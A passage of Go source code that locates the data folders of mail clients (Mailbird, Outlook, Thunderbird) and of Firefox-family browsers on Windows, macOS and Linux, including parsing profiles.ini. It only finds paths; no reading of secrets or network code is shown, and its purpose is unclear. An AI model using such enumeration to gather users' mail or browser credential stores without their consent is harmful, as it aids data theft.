	}
	return paths
}

func mailbirdDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Mailbird"),
				filepath.Join(localAppData, "Mailbird", "Store"),
			)
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Mailbird"))
		}
	}
	return paths
}

func outlookDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Microsoft", "Outlook"),
				filepath.Join(localAppData, "Microsoft", "Outlook", "RoamCache"),
			)
		}
		documents := os.Getenv("USERPROFILE")
		if documents == "" {
			documents = home
		}
		if documents != "" {
			paths = append(paths,
				filepath.Join(documents, "Documents", "Outlook Files"),
				filepath.Join(documents, "Documents", "My Outlook Data File"),
			)
		}
	case "darwin":
		if home != "" {
			group := filepath.Join(home, "Library", "Group Containers", "UBF8T346G9.Office", "Outlook")
			paths = append(paths,
				group,
				filepath.Join(group, "Outlook 15 Profiles"),
			)
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".local", "share", "evolution", "mail"))
		}
	}
	return paths
}

func thunderbirdDataPaths() []string {
	roots := thunderbirdRoots()
	return collectProfileDirs(roots, true)
}

func geckoProfileDirs() []string {
	roots := geckoRoots()
	return collectProfileDirs(roots, false)
}

func collectProfileDirs(roots []string, includeRootFallback bool) []string {
	seen := make(map[string]struct{})
	dirs := []string{}
	add := func(path string) {
		trimmed := strings.TrimSpace(path)
		if trimmed == "" {
			return
		}
		candidate := filepath.Clean(trimmed)
		if !filepath.IsAbs(candidate) {
			if abs, err := filepath.Abs(candidate); err == nil {
				candidate = abs
			}
		}
		info, err := os.Stat(candidate)
		if err != nil || !info.IsDir() {
			return
		}
		if _, exists := seen[candidate]; exists {
			return
		}
		seen[candidate] = struct{}{}
		dirs = append(dirs, candidate)
	}

	for _, root := range roots {
		root = strings.TrimSpace(root)
		if root == "" {
			continue
		}
		cleaned := filepath.Clean(root)
		if entries := parseGeckoProfilesINI(cleaned, filepath.Join(cleaned, "profiles.ini")); len(entries) > 0 {
			for _, entry := range entries {
				add(entry)
			}
		}
		profileDir := filepath.Join(cleaned, "Profiles")
		appendProfileDirs(profileDir, add, nil)
		if includeRootFallback {
			appendProfileDirs(cleaned, add, func(name string) bool {
				lower := strings.ToLower(name)
				if strings.Contains(lower, "default") || strings.Contains(lower, "profile") {
					return true
				}
				return strings.Contains(name, ".") || strings.Contains(name, "-")
			})
		} else {
			appendProfileDirs(cleaned, add, func(name string) bool {
				lower := strings.ToLower(name)
				if strings.Contains(lower, "default") || strings.Contains(lower, "release") {
					return true
				}
				if strings.Contains(lower, "profile") {
					return true
				}
				return strings.Contains(name, ".") || strings.Contains(name, "-")
			})
		}
	}

	sort.Strings(dirs)
	return dirs
}

func appendProfileDirs(dir string, add func(string), filter func(string) bool) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		if filter != nil && !filter(name) {
			continue
		}
		add(filepath.Join(dir, name))
	}
}

func parseGeckoProfilesINI(root, iniPath string) []string {
	file, err := os.Open(iniPath)
	if err != nil {
		return nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	current := make(map[string]string)
	profiles := []map[string]string{}
	flush := func() {
		if len(current) == 0 {
			return
		}
		entry := make(map[string]string, len(current))
		for k, v := range current {
			entry[k] = v
		}
		profiles = append(profiles, entry)
		current = make(map[string]string)
	}

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			flush()
			continue
		}
		if idx := strings.Index(line, "="); idx >= 0 {
			key := strings.TrimSpace(line[:idx])
			value := strings.TrimSpace(line[idx+1:])
			if key != "" {
				current[strings.ToLower(key)] = value
			}
		}
	}
	flush()

	dirs := []string{}
	for _, profile := range profiles {
		pathValue := strings.TrimSpace(profile["path"])
		if pathValue == "" {
			continue
		}
		candidate := filepath.FromSlash(pathValue)
		if profile["isrelative"] != "0" {
			candidate = filepath.Join(root, candidate)
		}
		dirs = append(dirs, candidate)
	}
	return dirs
}

func geckoRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			roots = append(roots,
				filepath.Join(appData, "Mozilla", "Firefox"),
				filepath.Join(appData, "Waterfox"),
				filepath.Join(appData, "LibreWolf"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			roots = append(roots,
				filepath.Join(localAppData, "Mozilla", "Firefox"),
				filepath.Join(localAppData, "Waterfox"),
				filepath.Join(localAppData, "LibreWolf"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			roots = append(roots,
				filepath.Join(support, "Firefox"),
				filepath.Join(support, "Waterfox"),
				filepath.Join(support, "LibreWolf"),
			)
		}
	default:
		if home != "" {
			roots = append(roots,
				filepath.Join(home, ".mozilla", "firefox"),
				filepath.Join(home, ".waterfox"),
				filepath.Join(home, ".librewolf"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			roots = append(roots,
				filepath.Join(config, "firefox"),
				filepath.Join(config, "waterfox"),
				filepath.Join(config, "librewolf"),
			)
		}
	}
	return roots
}

func thunderbirdRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			roots = append(roots, filepath.Join(appData, "Thunderbird"))
		}
	case "darwin":
		if home != "" {
			roots = append(roots, filepath.Join(home, "Library", "Thunderbird"))
		}
	default:
		if home != "" {
			roots = append(roots,
				filepath.Join(home, ".thunderbird"),
				filepath.Join(home, ".mozilla", "thunderbird"),
			)
		}
	}
	return roots
}
